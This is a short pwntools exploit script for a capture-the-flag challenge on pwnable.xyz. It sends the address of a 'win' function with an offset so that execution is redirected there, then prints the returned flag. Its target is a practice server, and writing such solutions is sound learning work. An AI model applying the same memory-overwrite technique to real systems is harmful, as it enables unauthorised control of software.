from pwn import *
import re

#context.log_level = 'debug'

#io = process('./image/challenge/challenge')
io = remote('svc.pwnable.xyz', 30002)

io.sendlineafter(b': ',(str(0x400822) + ' 0  13').encode('utf-8'))
io.sendlineafter(b': ',b'a')
io.recv()
io.recv()
flag = io.readS()
io.close()
print(flag)


# win Functions --> 0x400822


